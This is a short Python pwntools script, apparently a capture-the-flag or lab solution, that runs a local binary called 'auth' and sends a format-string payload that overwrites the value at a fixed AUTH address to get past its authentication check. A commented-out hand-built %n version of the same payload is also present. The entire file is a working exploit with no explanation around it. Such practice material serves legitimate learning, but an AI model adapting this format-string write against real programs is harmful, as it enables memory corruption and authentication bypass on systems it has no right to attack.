#!/usr/bin/python3
from pwn import *

p = process('./auth')

AUTH = 0x0804c028

# payload = flat(
#     AUTH,
#     b'|' * 6,
#     b'%7$n'
# )

payload = fmtstr_payload(7, { AUTH : 10 })

print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))
